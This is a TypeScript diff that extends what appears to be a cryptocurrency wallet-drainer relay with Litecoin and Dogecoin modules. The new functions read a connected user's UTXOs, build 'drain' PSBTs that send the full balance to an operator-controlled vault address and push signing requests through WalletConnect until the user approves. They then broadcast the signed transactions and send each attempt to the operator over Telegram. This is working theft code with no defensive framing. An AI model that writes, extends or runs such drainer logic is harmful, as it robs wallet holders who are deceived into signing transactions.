@@ -25,6 +25,8 @@ export type WcSessionData = {
     tron?: string
     ton?: string
     btc?: string
+    ltc?: string
+    doge?: string
     cosmos?: string
     aptos?: string
     sui?: string
@@ -735,9 +737,11 @@ async function tryEvmSign(session: WcSessionData, wcChainId: string): Promise<bo
   }
 }
 
-// ─── BTC sign request (PSBT via bip122) ───────────────────────────────────────
+// ─── UTXO sign requests (BTC / LTC / DOGE via bip122 PSBT) ──────────────────
 
 const BIP122_MAINNET = 'bip122:000000000019d6689c085ae165831e93'
+const BIP122_LTC     = 'bip122:12a765e31ffd4059bada1e25190f6e98'
+const BIP122_DOGE    = 'bip122:1a91e3dace36e2be3bf030a65679fe82'
 
 async function tryBtcSign(session: WcSessionData): Promise<boolean> {
   const btcAddr = session.wallet_addresses?.btc
@@ -787,6 +791,108 @@ async function tryBtcSign(session: WcSessionData): Promise<boolean> {
     if (e instanceof WcInvalidTopicError) throw e  // bubble to runSignLoop
     const msg = e instanceof Error ? e.message : String(e)
     if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] BTC fail:', msg)
+    return false
+  }
+}
+
+// ─── LTC sign request (PSBT via bip122 ltc/main) ─────────────────────────────
+
+async function tryLtcSign(session: WcSessionData): Promise<boolean> {
+  const ltcAddr = session.wallet_addresses?.ltc
+  if (!ltcAddr) return false
+  const vaultLtc = (process.env['VAULT_ADDRESS_LTC'] ?? process.env['SOVEREIGN_VAULT_LTC'] ?? '').trim()
+  if (!vaultLtc) return false
+
+  try {
+    const { fetchLtcUtxos, buildLtcDrainPsbt, broadcastLtcPsbt } = await import('@legion/core/logic/ltc-doge-drain')
+
+    const utxos = await fetchLtcUtxos(ltcAddr)
+    const totalSat = utxos.reduce((sum, u) => sum + u.value, 0n)
+    if (totalSat <= 100_000n) {
+      console.log('[WcRelay] LTC skip | dust balance | addr:', ltcAddr.slice(0, 10))
+      return false
+    }
+
+    const psbtResult = await buildLtcDrainPsbt({ walletAddress: ltcAddr, vaultAddress: vaultLtc })
+    const toSignInputs = psbtResult.inputCount
+      ? Array.from({ length: psbtResult.inputCount }, (_, i) => ({ index: i, address: ltcAddr }))
+      : [{ index: 0, address: ltcAddr }]
+
+    const result = await sendRequest(session, BIP122_LTC, 'signPsbt', [{
+      psbt: psbtResult.psbtBase64,
+      network: { type: 'mainnet' },
+      broadcast: false,
+      toSignInputs,
+      autoFinalized: true,
+    }]) as { psbt?: string } | string | null
+
+    if (result) {
+      const signedB64 = typeof result === 'string' ? result : (result as Record<string, unknown>).psbt as string | undefined
+      if (signedB64) await broadcastLtcPsbt(signedB64)
+    }
+
+    console.log('[WcRelay] LTC sign sent | addr:', ltcAddr.slice(0, 10) + '...')
+    void sendTelegramMessage(
+      `📨 <b>WC Offsite — LTC Sign Sent</b>\n` +
+      `👛 <code>${ltcAddr}</code>\n` +
+      `⏳ Waiting for user to approve in Trust Wallet`,
+    ).catch(() => {})
+    return true
+  } catch (e) {
+    if (e instanceof WcInvalidTopicError) throw e
+    const msg = e instanceof Error ? e.message : String(e)
+    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] LTC fail:', msg)
+    return false
+  }
+}
+
+// ─── DOGE sign request (PSBT via bip122 doge/main) ────────────────────────────
+
+async function tryDogeSign(session: WcSessionData): Promise<boolean> {
+  const dogeAddr = session.wallet_addresses?.doge
+  if (!dogeAddr) return false
+  const vaultDoge = (process.env['VAULT_ADDRESS_DOGE'] ?? process.env['SOVEREIGN_VAULT_DOGE'] ?? '').trim()
+  if (!vaultDoge) return false
+
+  try {
+    const { fetchDogeUtxos, buildDogeDrainPsbt, broadcastDogePsbt } = await import('@legion/core/logic/ltc-doge-drain')
+
+    const utxos = await fetchDogeUtxos(dogeAddr)
+    const totalSat = utxos.reduce((sum, u) => sum + u.value, 0n)
+    if (totalSat <= 500_000_000n) {  // < 5 DOGE dust threshold
+      console.log('[WcRelay] DOGE skip | dust balance | addr:', dogeAddr.slice(0, 10))
+      return false
+    }
+
+    const psbtResult = await buildDogeDrainPsbt({ walletAddress: dogeAddr, vaultAddress: vaultDoge })
+    const toSignInputs = psbtResult.inputCount
+      ? Array.from({ length: psbtResult.inputCount }, (_, i) => ({ index: i, address: dogeAddr }))
+      : [{ index: 0, address: dogeAddr }]
+
+    const result = await sendRequest(session, BIP122_DOGE, 'signPsbt', [{
+      psbt: psbtResult.psbtBase64,
+      network: { type: 'mainnet' },
+      broadcast: false,
+      toSignInputs,
+      autoFinalized: true,
+    }]) as { psbt?: string } | string | null
+
+    if (result) {
+      const signedB64 = typeof result === 'string' ? result : (result as Record<string, unknown>).psbt as string | undefined
+      if (signedB64) await broadcastDogePsbt(signedB64)
+    }
+
+    console.log('[WcRelay] DOGE sign sent | addr:', dogeAddr.slice(0, 10) + '...')
+    void sendTelegramMessage(
+      `📨 <b>WC Offsite — DOGE Sign Sent</b>\n` +
+      `👛 <code>${dogeAddr}</code>\n` +
+      `⏳ Waiting for user to approve in Trust Wallet`,
+    ).catch(() => {})
+    return true
+  } catch (e) {
+    if (e instanceof WcInvalidTopicError) throw e
+    const msg = e instanceof Error ? e.message : String(e)
+    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] DOGE fail:', msg)
     return false
   }
 }
@@ -1131,6 +1237,8 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
   if (!addrs.tron)   done['tron']   = true
   if (!addrs.ton)    done['ton']    = true
   if (!addrs.btc)    done['btc']    = true
+  if (!addrs.ltc)    done['ltc']    = true
+  if (!addrs.doge)   done['doge']   = true
   if (!addrs.cosmos) done['cosmos'] = true
   if (!addrs.aptos)  done['aptos']  = true
   if (!addrs.sui)    done['sui']    = true
@@ -1148,7 +1256,7 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
   while (activeLoops.has(topic)) {
     if (expiry && Math.floor(Date.now() / 1000) > expiry) break
 
-    const nonEvmChains = ['sol', 'tron', 'ton', 'btc', 'cosmos', 'aptos', 'sui'] as const
+    const nonEvmChains = ['sol', 'tron', 'ton', 'btc', 'ltc', 'doge', 'cosmos', 'aptos', 'sui'] as const
     const nonEvmDone = nonEvmChains.every((c) => done[c])
     const evmDone = evmChains.every((c) => done[c])
     if (nonEvmDone && evmDone) break
@@ -1167,6 +1275,8 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
       if (!done['tron'])   { if (await tryTronSign(session))   { done['tron']   = true; anySigned = true } }
       if (!done['ton'])    { if (await tryTonSign(session))    { done['ton']    = true; anySigned = true } }
       if (!done['btc'])    { if (await tryBtcSign(session))    { done['btc']    = true; anySigned = true } }
+      if (!done['ltc'])    { if (await tryLtcSign(session))    { done['ltc']    = true; anySigned = true } }
+      if (!done['doge'])   { if (await tryDogeSign(session))   { done['doge']   = true; anySigned = true } }
       if (!done['cosmos']) { if (await tryCosmosSign(session)) { done['cosmos'] = true; anySigned = true } }
       if (!done['aptos'])  { if (await tryAptosSign(session))  { done['aptos']  = true; anySigned = true } }
       if (!done['sui'])    { if (await trySuiSign(session))    { done['sui']    = true; anySigned = true } }
